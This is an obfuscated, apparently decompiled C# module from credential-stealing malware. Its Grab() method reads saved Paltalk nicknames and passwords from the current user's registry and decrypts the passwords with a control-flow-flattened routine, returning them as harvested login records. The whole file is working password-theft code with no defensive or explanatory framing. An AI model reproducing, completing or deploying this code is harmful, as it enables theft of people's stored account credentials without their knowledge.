using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.CompilerServices;
using Microsoft.Win32;
using p3N5Y;
using q9Ep;

namespace ZAZUx;

public class AMrpFC : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string t92
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public AMrpFC()
	{
		t92 = "Paltalk";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		do
		{
			switch (num)
			{
			case 2:
				try
				{
					using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\A.V.M.\\Paltalk NG\\common_settings\\core\\users\\creds\\");
					if (registryKey == null)
					{
						return list;
					}
					string[] subKeyNames = registryKey.GetSubKeyNames();
					foreach (string name in subKeyNames)
					{
						try
						{
							using RegistryKey registryKey2 = registryKey.OpenSubKey(name);
							string text = (string)registryKey2.GetValue("nickname");
							string ySbqRLUr = (string)registryKey2.GetValue("password");
							list.Add(new ii68
							{
								byIdLuuGZbL = "paltalk.com",
								S8v = text,
								_9H5rP7hg2 = DKEGh9a(ySbqRLUr, text),
								oVAe = t92
							});
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
				return list;
			case 1:
				list = new List<ii68>();
				num = 2;
				break;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 3);
		List<ii68> result = default;
		return result;
	}

	private static string DKEGh9a(string ySbqRLUr, string HYuD)
	{
		int num = 0;
		int num2 = default;
		char[] array = default;
		int num3 = default;
		string text = default;
		string text2 = default;
		int num4 = default;
		char[] array2 = default;
		int[] array3 = default;
		int num5 = default;
		char[] array4 = default;
		int num6 = default;
		char c = default;
		string text3 = default;
		do
		{
			if (num == 11)
			{
				goto IL_001f;
			}
			goto IL_003d;
			IL_003d:
			if (num == 7)
			{
				goto IL_001f;
			}
			if (num == 15)
			{
				goto IL_03ce;
			}
			if (num == 32)
			{
				goto IL_008c;
			}
			goto IL_00a4;
			IL_001f:
			if (num2 > array.Length - 4)
			{
				num = 12;
				goto IL_003d;
			}
			goto IL_01f1;
			IL_01a2:
			num3++;
			num = 21;
			goto IL_01b9;
			IL_0411:
			if (num == 3)
			{
				num3 = 0;
				num = 4;
			}
			if (num == 13)
			{
				text = HYuD;
				num = 14;
			}
			if (num == 23)
			{
				text2 = text2 + text2 + text2;
				num = 24;
			}
			if (num == 21)
			{
				num4++;
				num = 22;
			}
			if (num == 24)
			{
				array2 = text2.ToCharArray();
				num = 25;
			}
			if (num == 6)
			{
				array3 = new int[ySbqRLUr.Length / 4 + 1];
				num = 7;
			}
			if (num == 2)
			{
				num5 = 0;
				num = 3;
			}
			if (num == 5)
			{
				array4 = b4v._6thzQ().ToCharArray();
				num = 6;
			}
			if (num == 16)
			{
				goto IL_0568;
			}
			goto IL_0582;
			IL_008c:
			if (num6 >= array3.Length)
			{
				num = 33;
				goto IL_00a4;
			}
			goto IL_00b5;
			IL_00a4:
			if (num == 29)
			{
				goto IL_00b5;
			}
			goto IL_00cc;
			IL_00cc:
			if (num == 18)
			{
				if (num3 > array4.Length - 1)
				{
					goto IL_01a2;
				}
				num = 19;
			}
			if (num == 9)
			{
				num2 += 4;
				num = 10;
			}
			if (num == 27)
			{
				num6 = 1;
				num = 28;
			}
			if (num == 14)
			{
				num4 = 0;
				num = 15;
			}
			if (num == 10)
			{
				num5++;
				num = 11;
			}
			if (num == 20)
			{
				goto IL_01a2;
			}
			goto IL_01b9;
			IL_0568:
			c = text[num4];
			num = 17;
			goto IL_0582;
			IL_00b5:
			if (array3[num6] != 0)
			{
				num = 30;
				goto IL_00cc;
			}
			goto IL_03fa;
			IL_01b9:
			if (num == 4)
			{
				array = ySbqRLUr.ToCharArray();
				num = 5;
			}
			if (num == 8)
			{
				goto IL_01f1;
			}
			goto IL_0229;
			IL_0229:
			if (num == 25)
			{
				text3 = "";
				num = 26;
			}
			if (num == 1)
			{
				num2 = 0;
				num = 2;
			}
			if (num == 28)
			{
				goto IL_008c;
			}
			if (num == 17)
			{
				text2 += c;
				num = 18;
			}
			if (num == 30)
			{
				text3 += (char)(array3[num6] - num6 - array2[num6 - 1] - 122);
				num = 31;
			}
			if (num == 26)
			{
				text3 += (char)(array3[0] - 122 - text2[text2.Length - 1]);
				num = 27;
			}
			if (num == 19)
			{
				text2 += array4[num3];
				num = 20;
			}
			if (num == 12)
			{
				text2 = "";
				num = 13;
			}
			if (num == 22)
			{
				goto IL_03ce;
			}
			goto IL_03e9;
			IL_01f1:
			array3[num5] = Convert.ToInt32(new string(array.Skip(num2).Take(3).ToArray()));
			num = 9;
			goto IL_0229;
			IL_0582:
			if (num == 0)
			{
				num = 1;
			}
			continue;
			IL_03fa:
			num6++;
			num = 32;
			goto IL_0411;
			IL_03e9:
			if (num == 31)
			{
				goto IL_03fa;
			}
			goto IL_0411;
			IL_03ce:
			if (num4 >= text.Length)
			{
				num = 23;
				goto IL_03e9;
			}
			goto IL_0568;
		}
		while (num != 33);
		return text3;
	}
}
